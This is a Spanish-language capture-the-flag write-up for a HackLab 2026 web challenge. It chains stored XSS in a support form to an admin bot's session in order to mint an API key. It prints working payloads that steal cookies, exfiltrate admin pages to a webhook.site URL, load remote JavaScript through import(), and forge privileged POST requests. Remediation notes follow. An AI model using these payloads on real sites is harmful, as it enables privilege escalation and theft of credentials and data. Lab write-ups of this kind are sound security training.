# Desafío - Juegos casi libres (HackLab)

**Plataforma:** Software Seguro — HackLab  
**Edición:** HackLab 2026  
**Categoría:** XSS Almacenado → Broken Access Control (Escalada de privilegios vía Bot Admin)  
**Equipo:** GoT  
**Autor:** adonaissh  
**Flag:** `23833dade2742ee5800b38902faf99e5`  

---

## 📌 Enunciado

> **Juegos casi libres** es una tienda de videojuegos con ~70 títulos creada completamente por una IA.
>
> La misión: adquirir aquel juego donde están otras IAs (maliciosas) que planean algo terrible contra los humanos. No sabemos su nombre exacto, pero se interceptó un fragmento de conversación entre las IAs:
>
> - **IA-07:** *¿Confirmás el punto de encuentro? No quiero que un humano caiga de casualidad.*
> - **IA-12:** *Tranquila. Elegimos un juego de disparos, de esos tácticos por equipos. Ningún humano sospecha de un shooter más.*
> - **IA-07:** *¿Y por qué justo ese y no el original de siempre?*
> - **IA-12:** *Porque es la versión hecha acá, en el extremo sur del planeta. Nadie mira lo que se cocina tan abajo en el mapa.*
> - **IA-07:** *Entendido. Mismo clásico de siempre, pero con los colores celeste y blanco. Nos vemos adentro.*
>
> **Objetivo:** Deducir de qué juego hablan, engañar al sistema y adquirirlo.  
> **URL:** `https://chl-186564f1-9579-4562-9e26-87beced9b271-juegos-casi-libres.softwareseguro.com.ar/home`

---

## 🔍 Reconocimiento

### 1. Deducción del Juego Objetivo
Las pistas del diálogo interceptado se traducen directamente:
| Pista | Interpretación |
|---|---|
| *"Juego de disparos, tácticos por equipos"* | Shooter táctico tipo *Counter-Strike* |
| *"No el original de siempre"* / *"Mismo clásico pero…"* | Reskin / versión local argentina, no el juego oficial |
| *"Hecho acá, en el extremo sur del planeta"* | Argentina |
| *"Colores celeste y blanco"* | Bandera argentina, confirma el país |

El catálogo se carga dinámicamente mediante `GET /api/juegos`. Buscando entre los ~71 títulos, uno encaja de forma exacta:
```json
{
  "id": "84fbc9fa-6d7a-4943-8d3d-50cc19a792dc",
  "nombre": "Counter Strike Argentino",
  "descripcion": "Shooter táctico por equipos: plantá la bomba en el potrero o defendé el kiosco a los tiros. El único shooter del catálogo criollo."
}
```

> [!WARNING]
> **Diferencia de UUIDs:** Este UUID (`84fbc9fa-...`) es el identificador en el catálogo público de usuarios. Más adelante se descubre que el panel de administración maneja UUIDs internos diferentes para los mismos juegos. El UUID interno de *Counter Strike Argentino* en el panel admin es `82079e29-5de6-413e-969e-a347b91fb366`.

### 2. Mapa de Rutas de la Aplicación
Como usuario no autenticado o regular, las vistas disponibles son:
- `/home`: Catálogo de juegos.
- `/mis-juegos`: Juegos adquiridos por el usuario (inicialmente vacío).
- `/mis-premios`: Premios (vacío).
- `/reclamo/nuevo`: Formulario de soporte/reclamos.
- `/adquirir`: Endpoint `POST` para comprar/adquirir un juego.

### 3. Flujo de Adquisición
Inspeccionando el script `app.js` (ofuscado) en el catálogo, el botón **Adquirir** ejecuta:

```http
POST /adquirir HTTP/1.1
Content-Type: application/json
X-CSRFToken: <cookie csrftoken>

{
  "juego_id": "<id>",
  "api_key": "<clave>"
}
```

Si se envía una clave errónea o vacía, la API responde:
```json
{"ok": false, "error": "API Key inválida para este juego."}
```
Se verificó y descartó SQLi, NoSQLi, mass assignment y type-juggling en `/adquirir`. La API Key no viaja en el front ni en el catálogo.

### 4. La Pista Clave: Formulario de Reclamos (`/reclamo/nuevo`)
El formulario indica explícitamente:
> *"El administrador revisa cada reclamo y te deja una respuesta en el link que te damos al enviarlo."*

Esto delata la presencia de un bot administrador (headless browser tipo Chromium/Puppeteer) que abre los reclamos con una sesión administrativa activa.

**Estructura y restricciones del formulario:**
- Campos: `asunto` (máx. 50 caracteres) y `cuerpo` (máx. 200 caracteres, validado server-side).
- Protección anti-bot: Cloudflare Turnstile (token de un solo uso).
- Rate limit: 1 reclamo cada 70 segundos.

---

## 🔬 Identificación de la Vulnerabilidad

- **CWE-79: Stored Cross-Site Scripting (XSS Almacenado):**  
  En la vista del usuario (`/reclamo/<id>`), el contenido del cuerpo se visualiza debidamente escapado:
  ```html
  <p class="pre">&lt;img src=x onerror=...&gt;</p>
  ```
  **Sin embargo, la vista interna del panel de administración utiliza un template distinto que NO escapa el contenido.** Por ende, el script no ejecuta en el navegador del usuario pero sí en el navegador del bot administrador.
- **CWE-284: Broken Access Control (Confused Deputy):**  
  Al forzar al bot del administrador a ejecutar JavaScript, se pueden invocar funciones privilegiadas internas (`/admin-panel/claves/generar`) para emitir una API Key legítima para cualquier juego.

---

## 🚀 Cadena de Explotación Paso a Paso

Se utilizó [webhook.site](https://webhook.site/) como receptor externo para capturar las respuestas y exfiltraciones: `https://webhook.site/f2b00ce0-c7fa-438b-a0bd-434df8b32deb`.

### Paso 1: Confirmar Ejecución en el Bot y Tipo de Cookie
Se inyectó en el campo `cuerpo` un intento de robo de cookies:
```html
<img src=x onerror="fetch('https://webhook.site/f2b00ce0-c7fa-438b-a0bd-434df8b32deb?c='+document.cookie)">
```
Llegó un hit al webhook desde el navegador del bot (Linux / Chrome 127):
```text
?c=csrftoken=3CgehyOAO8pgs8UOoQ3pDWCyBiKBVHnU
```
- ✅ **Confirmado:** El XSS ejecuta en el admin.
- ❌ **Limitación:** La cookie `sessionid` es `HttpOnly` (no accesible por JS). No es posible robar la sesión directamente; es obligatorio hacer que el admin ejecute la acción en su propio contexto.

### Paso 2: Diagnóstico del Timing del Bot
El bot cierra la página rápidamente. Se constató que:
- `document.cookie` síncrono llega a enviar el request.
- `fetch().then()` encadenado a veces se abortaba antes de terminar.
- `location = ...` cancelaba peticiones en vuelo.

**Solución:** Utilizar `new Image().src = ...` para disparar requests de exfiltración de forma inmediata.

Se verificó que el admin tenía acceso a `/mis-juegos`:
```html
<img src=x onerror="u='https://webhook.site/f2b00ce0-c7fa-438b-a0bd-434df8b32deb?';fetch('/mis-juegos').then(r=>new Image().src=u+'st='+r.status).catch(e=>new Image().src=u+'e='+e)">
```
Respuesta recibida en el webhook: `?st=200`.

### Paso 3: Exfiltrar el Menú del Admin y Descubrimiento de `/admin-panel`
Se extrajo el HTML que ve el admin en `/mis-juegos`:
```html
<img src=x onerror="fetch('/mis-juegos').then(r=>r.text()).then(d=>new Image().src='https://webhook.site/f2b00ce0-c7fa-438b-a0bd-434df8b32deb?a='+encodeURIComponent(d.slice(0,400)))">
```
El documento devuelto contenía `<title>Panel Admin</title>` y un enlace en la barra de navegación hacia una ruta restringida: **`/admin-panel`**.

### Paso 4: Superar el Límite de 200 Caracteres con Loader Remoto (`import()`)
Para no lidiar con el límite estricto de 200 caracteres en el cuerpo del reclamo, se convirtió el payload del XSS en un loader modular dinámico de ~85 caracteres:

```html
<img src=x onerror="import('https://webhook.site/f2b00ce0-c7fa-438b-a0bd-434df8b32deb')">
```

> [!IMPORTANT]
> **Configuración en Webhook.site:**
> - **Status:** `200`
> - **Content-Type:** `text/javascript`
> - **CORS Headers:** Activar `Access-Control-Allow-Origin: *` (obligatorio para que `import()` cross-origin no sea bloqueado por el navegador).

### Paso 5: Lectura del Panel Administrativo e Identificación del UUID Interno
Se alojó en webhook.site el script para inspeccionar `/admin-panel`:

```javascript
fetch('/admin-panel')
  .then(r => r.text())
  .then(d => {
    const form = d.match(/action="([^"]+)"/g) || [];
    const apicalls = d.match(/fetch\(['"`][^'"`]+['"`]/g) || [];
    new Image().src = 'https://webhook.site/f2b00ce0-c7fa-438b-a0bd-434df8b32deb?ep=' + encodeURIComponent(JSON.stringify({form, apicalls}));
  });
```

El HTML de `/admin-panel` reveló una sección **"Generar API Key"** con un `<select>` de juegos que cargaba el script `/static/juegos/js/admin.js`.  
Del `<option>` correspondiente a *Counter Strike Argentino*, se obtuvo el UUID interno:
$$\text{UUID Interno} = \text{82079e29-5de6-413e-969e-a347b91fb366}$$

### Paso 6: Deofuscación de `admin.js` y Endpoint de Generación
El script `admin.js` utilizaba una ofuscación basada en rotación de arrays y decodificación Base64 con alfabeto custom. Ejecutando la función decodificadora directamente en la consola del navegador:

```javascript
const raw = await fetch('/static/juegos/js/admin.js').then(r => r.text());
try { eval(raw); } catch(e) {}
for (let i = 0x19b; i <= 0x1d1; i++) {
  try {
    const v = a0_0x4440(i);
    if (typeof v === 'string') console.log('0x' + i.toString(16), '=', v);
  } catch(e) {}
}
```

Strings recuperados:
- `0x1a7`: `/admin-panel/claves/generar` (endpoint real).
- `0x1bd`: `application/json`
- `0x1c7`: `csrftoken`
- `0x1b5`: `clave` (campo con la API Key en el JSON de respuesta).

### Paso 7: Generación de la API Key desde la Sesión del Admin
Se configuró el script final en el webhook:

```javascript
const tok = document.cookie.match(/csrftoken=([^;]+)/)[1];
fetch('/admin-panel/claves/generar', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRFToken': tok
  },
  body: JSON.stringify({
    juego_id: '82079e29-5de6-413e-969e-a347b91fb366'
  })
})
.then(r => r.json())
.then(d => new Image().src = 'https://webhook.site/f2b00ce0-c7fa-438b-a0bd-434df8b32deb?clave=' + encodeURIComponent(d.clave || JSON.stringify(d)))
.catch(e => new Image().src = 'https://webhook.site/f2b00ce0-c7fa-438b-a0bd-434df8b32deb?err=' + encodeURIComponent(e.message));
```

Al disparar el reclamo con el loader `<img src=x onerror="import(...)">`, el bot administrador ejecutó la llamada y exfiltró la clave al webhook:
```text
?clave=9f34ebcff44567e182aa44ed10faecfa
```

### Paso 8: Adquisición del Juego y Flag
Desde la cuenta estándar en `/home`:
1. Se seleccionó **Counter Strike Argentino**.
2. Se hizo clic en **Adquirir**.
3. Se ingresó la API Key generada: `9f34ebcff44567e182aa44ed10faecfa`.

**Respuesta en pantalla:**
> *¡Adquiriste Counter Strike Argentino! FLAG: 23833dade2742ee5800b38902faf99e5*

---

## 🏁 Flag

```text
23833dade2742ee5800b38902faf99e5
```

---

## 🛡️ Causa Raíz y Remediación

- **Inconsistencia de Renderizado en Templates (CWE-79):** El cuerpo del reclamo se sanitizaba en la vista del usuario, pero se renderizaba sin escapar (`|safe` o similar) en la interfaz del administrador. Todo contenido ingresado por usuarios debe escapar metacaracteres HTML uniformemente en todas las vistas.
- **Ausencia de Content Security Policy (CSP):** No existían directivas restrictivas (`script-src`, `connect-src`), lo que permitió importar dinámicamente un módulo JS arbitrario (`import()`) y exfiltrar datos hacia `webhook.site`.
- **Falta de Re-autenticación en Funciones Críticas:** Endpoints de generación de licencias y claves deben solicitar confirmación de credenciales (re-auth) y no depender ciegamente de una cookie de sesión activa.
